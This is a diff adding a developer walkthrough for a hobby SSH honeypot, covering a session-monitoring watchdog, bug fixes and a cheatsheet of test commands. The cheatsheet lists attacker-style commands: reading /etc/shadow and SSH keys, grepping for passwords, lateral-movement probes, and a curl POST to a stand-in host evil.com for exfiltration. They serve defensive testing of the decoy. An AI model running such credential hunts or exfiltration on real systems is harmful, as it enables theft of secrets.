@@ -1,0 +1,171 @@
+# Walkthrough: GIA + Bug Fixes
+
+## Changes Made
+
+### 1. [NEW] [intelligence_agency.py](file:///d:/just%20learning/ghostnet/agents/intelligence_agency.py) — GIA Watchdog
+Background daemon thread that monitors all sessions every 5 seconds:
+- **Bot Detector** — flags sessions with < 200ms between commands
+- **Suspicion Scorer** — detects ls-spam, timestamp checking, escape attempts
+- **Realism Validator** — checks breadcrumb file timestamps aren't too recent
+- **Session Integrity** — cleans zombie sessions from DB
+
+### 2. [MODIFIED] [file_system.py](file:///d:/just%20learning/ghostnet/state_manager/file_system.py) — Bug 1 Fix
+Dotfiles (`.bash_history`, `.bashrc`, `.profile`, `.ssh`) moved to dedicated [_inject_dotfiles()](file:///d:/just%20learning/ghostnet/state_manager/file_system.py#158-170) method called **last** in [_build_tree()](file:///d:/just%20learning/ghostnet/state_manager/file_system.py#101-157).
+
+### 3. [MODIFIED] [main.py](file:///d:/just%20learning/ghostnet/main.py) — Bug 2 Fix + GIA
+- [increment_cmd](file:///d:/just%20learning/ghostnet/agents/breadcrumbs.py#136-140) moved inside background thread (not main thread)
+- 3–10s random delay before planting breadcrumbs
+- Plausibility check: skip empty directories
+- Realistic timestamps on breadcrumb files (5–60 days old)
+- GIA started on init, records command times, cleans up on exit/shutdown
+
+### 4. [MODIFIED] [app.py](file:///d:/just%20learning/ghostnet/dashboard/app.py) — GIA Alerts
+Intelligence tab now shows per-session: intent progression, canary status, GIA alerts (color-coded), threat report button.
+
+## Verification
+- ✅ `.bash_history` exists and resolves correctly
+- ✅ GIA instantiation and command timing works
+- ✅ All 4 component tests pass
+- ✅ All [SessionDatabase](file:///d:/just%20learning/ghostnet/state_manager/database.py#121-296) methods needed by dashboard exist
+
+---
+
+# 🎯 Test Commands Cheatsheet
+
+> **Setup:** Start the honeypot (`python main.py`) and dashboard (`streamlit run dashboard/app.py`). SSH in with `ssh user@localhost -p 2222` (password: anything works).
+
+## Path 1: Credential Hunt → CRITICAL Alert
+
+```bash
+# Step 1: Look around (reconnaissance)
+ls
+pwd
+whoami
+
+# Step 2: Hunt for credentials (triggers "credential_hunt" intent)
+cat .bash_history
+cat .bashrc
+cat /etc/shadow
+grep -r password /etc
+cat .env
+
+# Step 3: Wait ~10 seconds, then ls — a config.php or similar should appear
+ls
+
+# Step 4: Open the planted file (triggers CANARY TRIPWIRE → CRITICAL ALERT)
+cat config.php
+# Dashboard should now show a red pulsing CRITICAL ALERT banner!
+```
+
+## Path 2: SSH Key Hunt
+
+```bash
+ls .ssh
+cat .ssh/id_rsa
+find / -name id_rsa
+find / -name *.pem
+cat authorized_keys
+# Wait 10s → ls → look for a planted fake SSH key file
+ls
+```
+
+## Path 3: Database Hunt
+
+```bash
+mysql --version
+cat .my.cnf
+find / -name *.sql
+psql
+# Wait 10s → ls → look for a .my.cnf or db config file
+ls
+```
+
+## Path 4: Lateral Movement
+
+```bash
+cat /etc/hosts
+arp -a
+ping 10.0.0.1
+ssh admin@10.0.0.5
+ip route
+# Wait 10s → ls → look for a vpn_connect.sh or similar
+ls
+```
+
+## Path 5: Exfiltration Prep
+
+```bash
+tar -czf backup.tar.gz /home
+find / -size +10M
+dd if=/dev/zero of=/tmp/test
+curl -X POST http://evil.com/upload
+# Wait 10s → ls → look for a fake backup manifest
+ls
+```
+
+## Path 6: Trigger Bot Detection (GIA)
+
+```bash
+# Type these as fast as possible (copy-paste all at once):
+ls
+whoami
+pwd
+id
+uname -a
+cat /etc/passwd
+ifconfig
+netstat -tlnp
+cat /etc/hosts
+hostname
+# If typed < 200ms apart (5+ in a row), GIA flags "bot_detected"
+# Check dashboard Intelligence tab → GIA Alerts section
+```
+
+## Path 7: Trigger Suspicion Alert (GIA)
+
+```bash
+# Repeatedly check directory (looks like you're watching for changes):
+ls
+ls
+ls -la
+ls
+# GIA flags "suspicious_behavior — ls_spam"
+```
+
+## Path 8: Full Attack Simulation (Everything)
+
+```bash
+# Phase 1: Recon
+whoami
+uname -a
+id
+cat /etc/passwd
+ifconfig
+
+# Phase 2: Credential hunt
+cat .bash_history
+cat .env
+grep -r password /home
+
+# Phase 3: Wait 10s, then check for planted file
+ls
+cat config.php          # ← CANARY HIT! Critical alert!
+
+# Phase 4: Lateral movement
+cat /etc/hosts
+ssh admin@10.0.0.5
+
+# Phase 5: Exit
+exit
+# Dashboard should show session as "disconnected"
+```
+
+## What to Check on Dashboard
+
+| Tab | What you should see |
+|-----|-----|
+| **Live Terminal** | Real-time command output, typing buffer |
+| **Intelligence** | Command history per session |
+| **Sessions** | Active/disconnected sessions table |
+| **Intelligence & GIA** | Intent badges, canary status, GIA alerts, threat report button |
+| **Analytics** | Summary stats |
